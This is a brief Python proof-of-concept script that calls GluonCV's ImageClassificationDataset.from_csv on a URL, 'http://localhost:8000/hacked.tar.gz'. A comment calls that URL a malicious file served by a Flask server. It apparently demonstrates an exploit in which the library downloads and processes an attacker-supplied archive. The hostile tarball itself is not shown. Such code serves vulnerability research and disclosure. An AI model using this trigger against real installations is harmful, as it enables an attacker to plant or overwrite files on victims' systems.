from gluoncv.auto.data.dataset import ImageClassificationDataset

# URL pointing to the malicious file hosted by the Flask server
url = 'http://localhost:8000/hacked.tar.gz'
ImageClassificationDataset.from_csv(url)